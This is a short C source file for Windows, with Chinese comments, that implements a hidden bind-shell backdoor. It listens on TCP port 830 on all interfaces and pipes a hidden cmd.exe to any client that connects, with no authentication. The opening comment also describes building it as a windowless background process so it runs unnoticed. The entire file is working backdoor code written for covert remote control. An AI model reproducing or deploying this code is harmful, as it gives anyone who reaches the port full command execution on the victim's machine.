/*
思路： 
监听**端口，等待连结，远程SHELL! 
实现： 
初始化SOCKET,然后bind端口，再监听listen,如果有请求，Accept!（利用双管道） 
提取SHELL. 
至此，如果有人TELNET本机的830端口就会得到本地的SHELL,( telnet 127.0.0.1 830   测试用)！ 
隐藏进程的代码，就是悄悄的再后台运行！ 
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"") 
int main() 
{ 
return 0; 
}
*/

#include <winsock2.h>
#include <stdio.h>
#pragma comment (lib,"ws2_32")
int main()
{

    WSADATA ws;
    SOCKET listenFD;
    char Buff[1024];
    int ret;
    //初始化wsa
    WSAStartup(MAKEWORD(2, 2), &ws);
    //建立socket
    listenFD = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    //监听本机830端口
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(830);
    server.sin_addr.s_addr = ADDR_ANY;
    ret = bind(listenFD, (sockaddr *)&server, sizeof(server));
    ret = listen(listenFD, 2);
    //如果客户请求830端口，接受连接
    int iAddrSize = sizeof(server);
    SOCKET clientFD = accept(listenFD, (sockaddr *)&server, &iAddrSize);
    SECURITY_ATTRIBUTES pipeattr1, pipeattr2;
    HANDLE hReadPipe1, hWritePipe1, hReadPipe2, hWritePipe2;
    //建立匿名管道1
    pipeattr1.nLength = 12;
    pipeattr1.lpSecurityDescriptor = 0;
    pipeattr1.bInheritHandle = true;
    CreatePipe(&hReadPipe1, &hWritePipe1, &pipeattr1, 0);
    //建立匿名管道2
    pipeattr2.nLength = 12;
    pipeattr2.lpSecurityDescriptor = 0;
    pipeattr2.bInheritHandle = true;
    CreatePipe(&hReadPipe2, &hWritePipe2, &pipeattr2, 0);
    STARTUPINFO si;
    ZeroMemory(&si, sizeof(si));
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = hReadPipe2;
    si.hStdOutput = si.hStdError = hWritePipe1;
    char cmdLine[] = "cmd.exe";
    PROCESS_INFORMATION ProcessInformation;
    //建立进程
    ret = CreateProcess(NULL, cmdLine, NULL, NULL, 1, 0, NULL, NULL, &si, &ProcessInformation);
    //这段代码创建了一个CMD.EXE，把cmd.exe的标准输出和标准错误输出用第一个管道的写句柄替换
    //cmd.exe的标准输入用第二个管道的读句柄替换
    //*****如下
    unsigned long lBytesRead;
    while(1)
    {
        //检查管道1，即CMD进程是否有输出
        ret = PeekNamedPipe(hReadPipe1, Buff, 1024, &lBytesRead, 0, 0);
        if(lBytesRead)
        {
            //管道1有输出，读出数据发送给远程客户机
            ret = ReadFile(hReadPipe1, Buff, lBytesRead, &lBytesRead, 0);
            if(!ret)
                break;
            ret = send(clientFD, Buff, lBytesRead, 0);
            if(ret <= 0)
                break;
        }
        else
        {
            //否则接受远程客户机的命令
            lBytesRead = recv(clientFD, Buff, 1024, 0);
            if(lBytesRead <= 0)
                break;
            //将命令写入管道2，即传给CMD进程
            ret = WriteFile(hWritePipe2, Buff, lBytesRead, &lBytesRead, 0);
            if(!ret)
                break;
        }
    }
    return 0;
}
